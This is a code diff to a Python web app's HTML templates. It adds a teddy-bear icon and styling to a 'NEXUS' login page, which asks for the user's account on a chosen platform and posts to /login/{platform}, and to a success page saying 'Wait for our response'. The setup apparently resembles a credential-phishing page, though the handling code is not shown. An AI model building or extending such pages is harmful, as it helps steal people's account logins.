@@ -144,7 +144,7 @@ HTML_HOME = """
 </html>
 """
 
-# ---------- LOGIN PAGE (Dynamic: "Enter your [Platform] account") ----------
+# ---------- LOGIN PAGE (🧸 juu, "Enter your [Platform] account") ----------
 def get_login_page(platform):
     platform_name = PLATFORMS[platform]['name']
     return f"""
@@ -173,6 +173,7 @@ def get_login_page(platform):
             background: transparent;
             padding: 20px;
         }}
+        .brand-icon {{ font-size: 60px; margin-bottom: 6px; }}
         h1 {{
             font-size: 38px;
             font-weight: 700;
@@ -256,6 +257,7 @@ def get_login_page(platform):
 </head>
 <body>
     <div class="container">
+        <div class="brand-icon">🧸</div>
         <h1>NEXUS</h1>
         <p class="sub-head">Enter your {platform_name} account</p>
         <form action="/login/{platform}" method="POST">
@@ -291,7 +293,7 @@ def get_login_page(platform):
 </html>
 """
 
-# ---------- SUCCESS PAGE (You're welcome, Wait for our response, Go back, footer) ----------
+# ---------- SUCCESS PAGE (🧸 juu, "You're welcome", "Wait for our response") ----------
 SUCCESS_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -318,6 +320,7 @@ SUCCESS_PAGE = """
             background: transparent;
             padding: 20px;
         }
+        .brand-icon { font-size: 60px; margin-bottom: 6px; }
         h1 {
             font-size: 38px;
             font-weight: 700;
@@ -356,6 +359,7 @@ SUCCESS_PAGE = """
 </head>
 <body>
     <div class="container">
+        <div class="brand-icon">🧸</div>
         <h1>NEXUS</h1>
         <div class="welcome">You're welcome</div>
         <div class="response">Wait for our response</div>
